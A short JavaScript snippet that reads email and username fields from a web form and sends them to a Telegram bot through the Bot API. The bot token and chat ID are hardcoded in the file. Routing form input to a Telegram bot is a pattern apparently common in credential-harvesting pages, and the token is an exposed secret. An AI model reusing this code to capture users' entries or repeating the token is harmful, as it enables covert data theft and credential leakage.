function send() {
    let email = document.getElementById("email");
    let username = document.getElementById("username");

    sendtelegram(`Ismi: email: ${email.value}; username: ${username.value};`)
};


function sendtelegram(message) { let telegram_bot_id = "6498174538:AAEIG5gY_9eh5jTEQ6XYHna4zgpn4g3afF8"; let chat_id = 6036573046; let settings = { "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" }, "data": JSON.stringify({ "chat_id": chat_id, "text": message }) }; $.ajax(settings).done(function (response) { }); };


